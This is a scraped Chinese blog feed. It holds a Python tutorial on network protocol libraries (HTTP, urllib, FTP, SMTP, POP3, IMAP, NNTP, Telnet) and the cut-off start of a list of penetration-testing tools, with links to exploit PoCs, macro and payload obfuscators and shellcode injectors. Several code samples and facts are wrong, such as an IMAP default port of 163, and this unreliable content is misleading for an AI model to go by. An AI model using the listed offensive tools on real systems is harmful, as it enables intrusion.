title="HTTP库"></a>HTTP库</h1><p>HTTP是一个客户端到服务器端的请求和应答的标准。客户端是终端用户，服务器端是网站。客户端发起一个到服务器上指定端口的HTTP请求，服务器向客户端发回一个状态行和响应的消息。<br>可以使用下面的模块创建Internet Server。<br>（1）socketserver：以socket为基础，一般性的IP Server。<br>（2）http：通过http模块中的子模块server和client提供各种网络服务。</p><h2 id="socketserver模块"><a href="#socketserver模块" class="headerlink" title="socketserver模块"></a>socketserver模块</h2><p>socketserver模块提供一个架构，来简化网络服务器的编写工作。用户不需要使用低级的socket模块，socketserver模块提供四个基本的server类：TCPServer，UDPServer，StreamRequestHandler以及DatagramRequestHandler。这些类处理同步的要求，每一个请求都必须在下一个请求开始前完成。但是如果是客户端需要长时间的计算，这些类就不适合。</p><p>为了通过线程程来处理要求，可以使用下列类：ThreadingTCPServer，ThreadingUDPServer，ForkingTCPServer以及ForkingUDPServer。</p><p>（1）TCPServer((hostname,port),handler):支持TCP协议的服务器。其中，hostname是主机名称，通常是空白字符串；port是通信端口号；handler是BaseRequestHandler类的实例变量。<br>（2）UDPServer((hostname,port),handler):支持UDP协议的服务器。其中，hostname是主机名称，通常是空白字符串；port是通信端口号；handler是BaseRequestHandler类的实例变量。</p><h2 id="server模块"><a href="#server模块" class="headerlink" title="server模块"></a>server模块</h2><p>http模块的子模块server提供各种HTTP服务。主要包括BaseHTTPServer类、CGIHTTPServer类与SimpleHTTPServer类。<br>server模块定义两个基类，来操作基本的HTTP服务器(也称为网站服务器)。此模块以socketserver模块为基础，并且很少直接使用。<br>server模块的第一个基类是HTTPServer类，其语法为：<br><code>class HTTPServer((hostname, port), RequestHandlerClass)</code><br>HTTPServer类由socketserver.TCPServer类派生。此类创建一个HTTPServer对象，并且监听(hostname, port)，然后使用RequestHandlerClass来处理要求。</p><h2 id="client模块"><a href="#client模块" class="headerlink" title="client模块"></a>client模块</h2><p>client模块主要处理客户端的请求。client模块的HTTPConnection类创建并且返回一个connection对象。HTTPConnection类的语法如下：<br><code>class HTTPConnection ([hostname [, port]])</code><br>如果没有设置参数port，默认值是80。如果所有的参数都没有设置，必须使用connect()方法来自行连接。<br>使用HTTPConnection类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import http.client</span><br><span class="line"></span><br><span class="line">#指定主机名称</span><br><span class="line">url = &quot;www.python.org&quot;</span><br><span class="line">#指定打开的文件名称</span><br><span class="line">urlfile = &quot;/News.html&quot;</span><br><span class="line"></span><br><span class="line">#连接到主机</span><br><span class="line">host = http.client.HTTPConnection (url)</span><br><span class="line"></span><br><span class="line">#写入客户端要求表头的第一行</span><br><span class="line">host.request(&quot;GET&quot;, urlfile)</span><br><span class="line">#获取服务器的响应</span><br><span class="line">r1=host.getresponse()</span><br><span class="line">#打印服务器返回的状态</span><br><span class="line">print(r1.status,r1.reason)</span><br><span class="line">#将file对象的内容存入新文件</span><br><span class="line">file = open(&quot;D:\\python\\ch14\\14.1.html&quot;, &quot;w&quot;)</span><br><span class="line">#读取网页内容,以utf-8方式保存</span><br><span class="line">str = r1.read().decode(&quot;utf-8&quot;)</span><br><span class="line">#寻找文本</span><br><span class="line">print(str.find(&quot;mlive&quot;)) </span><br><span class="line">#写到文件并替换 &apos;xa0&apos; 为空字符</span><br><span class="line">file.write(str.replace(&apos;\xa0&apos;,&apos;&apos;)) </span><br><span class="line">#关闭文件</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></p><h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><p>urllib库可以处理客户端的请求和服务器端的响应，还可以解析URL地址，常用的模块有request和parse。</p><h2 id="request模块"><a href="#request模块" class="headerlink" title="request模块"></a>request模块</h2><p>request模块是使用socket来读取网络数据的接口，支持HTTP，FTP，以及gopher等连接。<br>要读取一个网页文件，可以使用urlopen()方法。语法如下：<br><code>urllib.request.urlopen(url [, data])</code><br>其中参数url是一个URL字符串；参数data用来指定一个GET请求。<br>urlopen()方法返回一个stream对象，可以用file对象的方法来操作此stream对象。</p><p>下面用urlopen方法抓取网页文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line">#打开网页文件</span><br><span class="line">htmlhandler = urllib.request.urlopen(&quot;http://www.baidu.com&quot;)</span><br><span class="line"></span><br><span class="line">#在本机上创建一个新文件</span><br><span class="line">file = open(&quot;C:\\python\\2.html&quot;, &quot;wb&quot;)</span><br><span class="line"></span><br><span class="line">#将网页文件存储到本机文件上,每次读取512个字节</span><br><span class="line">while 1:</span><br><span class="line">    data = htmlhandler.read(512)</span><br><span class="line">    if not data:</span><br><span class="line">        break</span><br><span class="line">    file.write(data)</span><br><span class="line"></span><br><span class="line">#关闭本机文件</span><br><span class="line">file.close()</span><br><span class="line">#关闭网页文件</span><br><span class="line">htmlhandler.close()</span><br></pre></td></tr></table></figure><h2 id="parse模块"><a href="#parse模块" class="headerlink" title="parse模块"></a>parse模块</h2><p>parse模块解析URL字符串，并且返回一个元组：(addressing scheme, netword location, path, parameters, query, fragment identifier)。parse模块可以将URL分解成数个部分，然后再组合回来，并且可以将相对地址转换成绝对地址。</p><h1 id="FTP模块"><a href="#FTP模块" class="headerlink" title="FTP模块"></a>FTP模块</h1><p>FTP(File Transfer Protocol)是一种在网络上传输文件的普遍方式，因为在大部分的操作系统上都有客户端的FTP与服务器端的FTP服务。服务器端的FTP可以同时使用在私有(private)的用户，与匿名(anonymous)的用户。<br>私有的服务器端FTP只允许系统用户来连接，匿名的服务器端FTP则允许不需帐号即可以连接网络来传输文件。使用匿名的服务器端FTP，会产生安全性的问题。<br>FTP提供一个控制端口与一个数据端口，在服务器端与客户端之间的数据传输使用独立的socket，以避免死机的问题。<br>Python中默认安装的ftplib模块定义了FTP类，可用来创建一个FTP连接，用于上传或下载文件。FTP类的语法如下所示：<br><code>class FTP([host [, user [, passwd [, acct]]]])</code><br>其中host是主机名称，user是用户帐号，passwd是用户密码。</p><p>上传FTP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from ftplib import FTP</span><br><span class="line"></span><br><span class="line">ftp = FTP()</span><br><span class="line">timeout = 30</span><br><span class="line">port = 21</span><br><span class="line"># 连接FTP服务器</span><br><span class="line">ftp.connect(&apos;192.168.1.106&apos;,port,timeout) </span><br><span class="line"># 登录FTP服务器</span><br><span class="line">ftp.login(&apos;adminns&apos;,&apos;123456&apos;) </span><br><span class="line"># 获得欢迎信息</span><br><span class="line">print (ftp.getwelcome())</span><br><span class="line">ftp.cwd(&apos;file/test&apos;)    # 设置FTP路径</span><br><span class="line">list = ftp.nlst()       # 获得目录列表</span><br><span class="line"># 打印文件名字</span><br><span class="line">for name in list:</span><br><span class="line">    print(name) </span><br><span class="line"># 文件保存路径</span><br><span class="line">path = &apos;d:/data/&apos; + name </span><br><span class="line"># 打开要保存文件</span><br><span class="line">f = open(path,&apos;wb&apos;) </span><br><span class="line"># 保存FTP文件</span><br><span class="line">filename = &apos;RETR &apos; + name   </span><br><span class="line"># 保存FTP上的文件</span><br><span class="line">ftp.retrbinary(filename,f.write) </span><br><span class="line"># 删除FTP文件</span><br><span class="line">ftp.delete(name)            </span><br><span class="line"># 上传FTP文件</span><br><span class="line">ftp.storbinary(&apos;STOR &apos;+filename, open(path, &apos;rb&apos;)) </span><br><span class="line"># 退出FTP服务器</span><br><span class="line">ftp.quit()</span><br></pre></td></tr></table></figure><h1 id="电子邮件服务协议"><a href="#电子邮件服务协议" class="headerlink" title="电子邮件服务协议"></a>电子邮件服务协议</h1><p>SMPT协议与POP3协议提供电子邮件服务。SMPT是网络上传输电子邮件的标准，定义应用程序如何在网络上交换电子邮件。SMPT协议负责将电子邮件放在电子邮箱内。若要从电子邮箱内取出电子邮件，则需要POP3协议。POP3负责从网络客户端读取邮件，并指定由监督武器如何传输电子邮件。POP3协议的目的是存取远程的外部服务器。</p><h2 id="smptlib模块"><a href="#smptlib模块" class="headerlink" title="smptlib模块"></a>smptlib模块</h2><p>Python的smptlib模块提供SMTP协议的客户端接口，用来传输电子邮件到网络上的其他机器。<br>smptlib模块定义一个SMTP类，用来创建一个SMTP连接。SMTP类的语法如下所示：<br><code>class SMTP([host [, port]])</code><br>其中参数host是主机名称。下列是SMTP类的实例变量的方法列表：<br>⑴ connect(host [, port])：连接到(host, port)，port的默认值是25。<br>⑵ sendmail(from_addr, to_addrs, msg [, mail_options, rcpt_options])：送出电子邮件。from_addr是RFC 822 from-address字符串，to_addr是RFC 822 to-address字符串。msg是一个信息字符串。<br>⑶ quit()：结束SMTP连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import smtplib</span><br><span class="line"></span><br><span class="line">#指定SMTP服务器</span><br><span class="line">host = &quot;smtp.163.com&quot;</span><br><span class="line"></span><br><span class="line">#寄件者的电子邮件信箱</span><br><span class="line">sender = &quot; chengcai@163.com &quot;</span><br><span class="line"></span><br><span class="line">#收件者的电子邮件信箱</span><br><span class="line">receipt = &quot; sanduo@163.com &quot;</span><br><span class="line"></span><br><span class="line">#电子邮件的内容</span><br><span class="line">msg = &quot;&quot;&quot;</span><br><span class="line">您好:</span><br><span class="line">    这是一个测试的电子邮件</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#创建SMTP类的实例变量</span><br><span class="line">myServer = smtplib.SMTP(host)</span><br><span class="line"></span><br><span class="line">#寄出电子邮件</span><br><span class="line">myServer.sendmail(sender, receipt, msg)</span><br><span class="line"></span><br><span class="line">#关闭连接</span><br><span class="line">myServer.quit()</span><br></pre></td></tr></table></figure><h2 id="poplib模块"><a href="#poplib模块" class="headerlink" title="poplib模块"></a>poplib模块</h2><p>Python的poplib模块提供POP3协议的客户端接口，用来从网络上接收电子邮件。<br>poplib模块定义一个POP3类，用来创建一个POP3连接。POP3类的语法如下所示：<br><code>class POP3([host [, port]])</code><br>其中host是主机名称，port的默认值是110。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import poplib, string</span><br><span class="line"></span><br><span class="line">#指定POP服务器</span><br><span class="line">host = &quot;saturn.seed.net.tw&quot;</span><br><span class="line"></span><br><span class="line">#创建一个POP3类的实例变量</span><br><span class="line">myServer = poplib.POP3(host)</span><br><span class="line"></span><br><span class="line">#返回POP3服务器送出的欢迎字符串</span><br><span class="line">print (myServer.getwelcome())</span><br><span class="line"></span><br><span class="line">#输入电子邮件的帐号</span><br><span class="line">myServer.user(&quot;johnny&quot;)</span><br><span class="line">#输入电子邮件的密码</span><br><span class="line">myServer.pass_(&quot;123456&quot;)</span><br><span class="line"></span><br><span class="line">#返回信息列表</span><br><span class="line">r, items, octets = myServer.list()</span><br><span class="line"></span><br><span class="line">#读取最后一个信息</span><br><span class="line">msgid, size = string.split(items[-1])</span><br><span class="line"></span><br><span class="line">#返回最后一个信息号码的内容</span><br><span class="line">r, msg, octets = myServer.retr(msgid)</span><br><span class="line">msg = string.join(msg, &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">#打印后一个信息号码的内容</span><br><span class="line">print (msg)</span><br></pre></td></tr></table></figure><h2 id="imaplib模块"><a href="#imaplib模块" class="headerlink" title="imaplib模块"></a>imaplib模块</h2><p>Python的imaplib模块提供IMAP协议的客户端接口。imaplib模块定义一个IMAP4类，用来创建一个IMAP连接。IMAP4类的语法如下所示：<br><code>class IMAP4([host [, port]])</code><br>其中host是主机名称，port的默认值是163。<br>下列是IMAP4类的实例变量的方法列表：<br>⑴ fetch(message_set, message_parts)：取出信息。<br>⑵ login(user, password)：登录IMAP4服务器。<br>⑶ logout()：注销IMAP4服务器，关闭连接。<br>⑷ search(charset, criterium [, …])：搜索邮件信箱找出符合的信息。<br>⑸ select([mailbox [, readonly]])：选择一个邮件信箱。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import imaplib, getpass, string</span><br><span class="line">host = &quot;imap.dummy.com&quot;</span><br><span class="line">user = &quot;jonny&quot;</span><br><span class="line">pwd = getpass.getpass()</span><br><span class="line">msgserver = imaplib.IMAP4(host)</span><br><span class="line">msgserver.login(user, pwd)</span><br><span class="line">msgserver.select()</span><br><span class="line">msgtyp, msgitems = msgserver.search(None, &quot;ALL&quot;)</span><br><span class="line">for idx in string.split(msgitems[0]):</span><br><span class="line">    msgtyp, msgitems = msgserver.fetch(idx, &quot;(RFC822)&quot;)</span><br><span class="line">    print (&quot;Message %s\n&quot; % num)</span><br><span class="line">    print (&quot;---------------\n&quot;)</span><br><span class="line">    print (&quot;Content: %s&quot; % msgitems[0][1])</span><br><span class="line">msgserver.logout()</span><br></pre></td></tr></table></figure><h2 id="nntp模块"><a href="#nntp模块" class="headerlink" title="nntp模块"></a>nntp模块</h2><p>nntplib模块提供客户端的NNTP协议的接口，NNTP(Network News Transfer Protocol)是一个提供新闻群组(newsgroup)的服务。NNTP协议使用ASCII文字，在客户端与服务器端之间传输数据，同时也用来交换服务器间的新闻稿。<br>nntplib模块定义一个NNTP类，用来创建一个NNTP连接。NNTP类的语法如下所示：<br><code>class NNTP(host [, port [, user [, password [, readermode]]]])</code><br>其中host是主机名称，port的默认值是119。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import nntplib</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">#指定NNTP服务器</span><br><span class="line">host = &quot;news.microsoft.com&quot;</span><br><span class="line"></span><br><span class="line">#指定新闻群组</span><br><span class="line">group = &quot;microsoft.public.java.activex&quot;</span><br><span class="line"></span><br><span class="line">#输入要搜索的关键词</span><br><span class="line">keyword = raw_input(&quot;Enter keyword to search: &quot;)</span><br><span class="line"></span><br><span class="line">#连结到NNTP服务器</span><br><span class="line">myServer = nntplib.NNTP(host)</span><br><span class="line"></span><br><span class="line">#送出一个&quot;GROUP&quot;命令</span><br><span class="line">r, count, first, last, name = myServer.group(group)</span><br><span class="line"></span><br><span class="line">#返回所有的新闻稿</span><br><span class="line">r, messages = myServer.xover(first, last)</span><br><span class="line"></span><br><span class="line">#读取新闻稿的内容</span><br><span class="line">for id, subject, author, date, msgid, refer, size, lines in messages:</span><br><span class="line">    </span><br><span class="line">    #找到新闻稿中的主题有要搜索的关键词</span><br><span class="line">    if string.find(subject, keyword) &gt;= 0:</span><br><span class="line"></span><br><span class="line">        #读取id号码的新闻稿</span><br><span class="line">        r, id, msgid, msgbody = myServer.article(id)</span><br><span class="line"></span><br><span class="line">        #打印该新闻稿的作者,主题,与日期</span><br><span class="line">        print (&quot;Author: %s - Subject: %s - Date: %s\n&quot; % (author, subject, date))</span><br><span class="line"></span><br><span class="line">        #打印该新闻稿的内容</span><br><span class="line">        print (&quot;&lt;-Begin Message-&gt;\n&quot;)</span><br><span class="line">        print (msgbody)</span><br><span class="line">        print (&quot;&lt;-End Message-&gt;\n&quot;)</span><br></pre></td></tr></table></figure><h2 id="telnetlib模块"><a href="#telnetlib模块" class="headerlink" title="telnetlib模块"></a>telnetlib模块</h2><p>telnetlib模块提供客户端的Telnet协议的服务，Telnet协议用来连接远程的计算机，通常使用通信端口23。创建好Telnet连接后，就可以通过Telnet接口在远程的计算机上执行命令。<br>telnetlib模块定义一个Telnet类，用来创建一个Telnet连接。Telnet类的语法规则如下所示：<br><code>class Telnet([host [, port]])</code><br>其中host是主机名称，port的默认值是23。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import telnetlib</span><br><span class="line"></span><br><span class="line">#指定Telnet服务器</span><br><span class="line">host = &quot;http://www.dummy.com&quot;</span><br><span class="line"></span><br><span class="line">#指定用户帐号</span><br><span class="line">username = &quot;johnny&quot; + &quot;\n&quot;</span><br><span class="line">#指定用户密码</span><br><span class="line">password = &quot;123456&quot; + &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">#创建Telnet类的实例变量</span><br><span class="line">telnet = telnetlib.Telnet(host)</span><br><span class="line"></span><br><span class="line">#登入Telnet服务器,输入用户帐号与密码</span><br><span class="line">telnet.read_until(&quot;login: &quot;)</span><br><span class="line">telnet.write(username)</span><br><span class="line">telnet.read_until(&quot;Password: &quot;)</span><br><span class="line">telnet.write(password)</span><br><span class="line"></span><br><span class="line">#输入命令</span><br><span class="line">while 1:</span><br><span class="line">    command = raw_input(&quot;[shell]: &quot;)</span><br><span class="line">    telnet.write(command)</span><br><span class="line">    if command == &quot;exit&quot;:</span><br><span class="line">        break</span><br><span class="line">    telnet.read_all()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>适用于渗透测试不同阶段的工具收集整理</title>
      <link href="/aisnnu.github.io/uncategorized/aisnnu1/"/>
      <url>/aisnnu.github.io/uncategorized/aisnnu1/</url>
      
        <content type="html"><![CDATA[<p>该资源清单列表涵盖了一系列，适用于渗透测试不同阶段的开源/商业工具。</p><a id="more"></a><h1 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h1><h2 id="主动情报收集"><a href="#主动情报收集" class="headerlink" title="主动情报收集"></a>主动情报收集</h2><p>EyeWitness：可用于网站截图，以及提供一些服务器头信息，并在可能的情况下识别默认凭据。</p><p><a href="https://github.com/ChrisTruncer/EyeWitness" target="_blank" rel="noopener">https://github.com/ChrisTruncer/EyeWitness</a></p><p>AWSBucketDump：AWS S3安全扫描工具，允许你快速枚举AWS S3 buckets以查找有趣或机密的文件。</p><p><a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank" rel="noopener">https://github.com/jordanpotti/AWSBucketDump</a></p><p>AQUATONE：子域名枚举探测工具。</p><p><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a></p><p>spoofcheck：检查域是否可以被欺骗。它会检查SPF和DMARC记录是否存在允许欺骗的弱配置。</p><p><a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">https://github.com/BishopFox/spoofcheck</a></p><p>Nmap：用于发现计算机网络上的主机和服务。</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>dnsrecon：DNS枚举脚本。</p><p><a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">https://github.com/darkoperator/dnsrecon</a></p><h2 id="被动情报收集"><a href="#被动情报收集" class="headerlink" title="被动情报收集"></a>被动情报收集</h2><p>skiptracer：OSINT爬虫框架，利用PII paywall网站的一些基本python webscraping (BeautifulSoup) 来被动信息收集。</p><p><a href="https://github.com/xillwillx/skiptracer" target="_blank" rel="noopener">https://github.com/xillwillx/skiptracer</a></p><p>ScrapedIn：用于爬取LinkedIn的工具，不受API数据侦察的限制。</p><p><a href="https://github.com/dchrastil/ScrapedIn" target="_blank" rel="noopener">https://github.com/dchrastil/ScrapedIn</a></p><p>FOCA：主要用于在其扫描的文档中查找元数据和隐藏信息的工具。</p><p><a href="https://github.com/ElevenPaths/FOCA" target="_blank" rel="noopener">https://github.com/ElevenPaths/FOCA</a></p><p>The Harvester：是一个社会工程学工具，它通过搜索引擎、PGP服务器以及SHODAN数据库收集用户的email，子域名，主机，雇员名，开放端口和banner信息。</p><p><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></p><p>Metagoofil：提取目标网站可用公共文档（如pdf，doc，xls，ppt等）元数据的工具。</p><p><a href="https://github.com/laramies/metagoofil" target="_blank" rel="noopener">https://github.com/laramies/metagoofil</a></p><p>SimplyEmail：快速而简单的电子邮件侦察工具。</p><p><a href="https://github.com/killswitch-GUI/SimplyEmail" target="_blank" rel="noopener">https://github.com/killswitch-GUI/SimplyEmail</a></p><p>truffleHog：帮助开发人员检测他们在GitHub上发布的项目是否已经不小心泄漏了任何秘密密钥。</p><p><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a></p><p>Just-Metadata：一个收集和分析有关IP地址元数据的工具，并试图找到大型数据集内系统之间的关系。</p><p><a href="https://github.com/ChrisTruncer/Just-Metadata" target="_blank" rel="noopener">https://github.com/ChrisTruncer/Just-Metadata</a></p><p>typofinder：域名拼写错误检索工具。</p><p><a href="https://github.com/nccgroup/typofinder" target="_blank" rel="noopener">https://github.com/nccgroup/typofinder</a></p><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>Maltego：一款十分适合渗透测试人员和取证分析人员的优秀工具,其主要功能是开源情报收集和取证。</p><p><a href="https://www.paterva.com/web7/downloads.php" target="_blank" rel="noopener">https://www.paterva.com/web7/downloads.php</a></p><p>SpiderFoot：免费开源的网站信息收集类工具。</p><p><a href="https://github.com/smicallef/spiderfoot" target="_blank" rel="noopener">https://github.com/smicallef/spiderfoot</a></p><p>datasploit：OSINT框架，用于对公司，人员，电话号码，比特币地址等执行各种侦察技术，汇总所有原始数据，并以多种格式提供数据。</p><p><a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></p><p>Recon-ng：Python编写的全功能Web侦察框架。</p><p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng" target="_blank" rel="noopener">https://bitbucket.org/LaNMaSteR53/recon-ng</a></p><h2 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h2><p>Composite Moniker：CVE-2017-8570 PoC。</p><p><a href="https://github.com/rxwx/CVE-2017-8570" target="_blank" rel="noopener">https://github.com/rxwx/CVE-2017-8570</a></p><p>Exploit toolkit CVE-2017-8759：一个方便的python脚本，它为测试者和安全研究人员提供了一种快速有效的方式来测试Microsoft .NET Framework RCE。</p><p><a href="https://github.com/bhdresh/CVE-2017-8759" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-8759</a></p><p>CVE-2017-11882 Exploit：最多接受超过17k字节长度的命令/代码。</p><p><a href="https://github.com/unamer/CVE-2017-11882" target="_blank" rel="noopener">https://github.com/unamer/CVE-2017-11882</a></p><p>Adobe Flash Exploit：CVE-2018-4878。</p><p><a href="https://github.com/anbai-inc/CVE-2018-4878" target="_blank" rel="noopener">https://github.com/anbai-inc/CVE-2018-4878</a></p><p>Exploit toolkit CVE-2017-0199：一个方便的python脚本，它为测试人员和安全研究人员提供了一种快速有效的方式来测试Microsoft Office RCE。</p><p><a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="noopener">https://github.com/bhdresh/CVE-2017-0199</a></p><p>demiguise：HTA加密工具。</p><p><a href="https://github.com/nccgroup/demiguise" target="_blank" rel="noopener">https://github.com/nccgroup/demiguise</a></p><p>Office-DDE-Payloads：收集脚本和模板以生成嵌入DDE的Office文档，无宏命令执行技术。</p><p><a href="https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads" target="_blank" rel="noopener">https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads</a></p><p>CACTUSTORCH：是一个生成payload的框架,可用于基于James Forshaw的DotNetToJScript工具的攻防对抗。</p><p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p><p>SharpShooter：用于检索和执行任意CSharp源码的payload创建框架。</p><p><a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></p><p>Don’t kill my cat：用于生成被存储在polyglot图像中的混淆shellcode。</p><p><a href="https://github.com/Mr-Un1k0d3r/DKMC" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/DKMC</a></p><p>Malicious Macro Generator Utility：生成混淆宏，其中还包括AV/Sandboxes逃避机制。</p><p><a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a></p><p>SCT Obfuscator：Cobalt Strike SCT有效载荷混淆器。</p><p><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a></p><p>Invoke-Obfuscation：PowerShell混淆器。</p><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p>Invoke-DOSfuscation：powershell混淆编码框架。</p><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p><p>Unicorn：使用PowerShell降级攻击并将shellcode直接注入内存的工具。</p><p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p><p>Shellter：一个动态的shellcode注入工具，也是有史以来第一个真正动态的PE注入工具。</p><p><a href="https://www.shellterproject.com/" target="_blank" 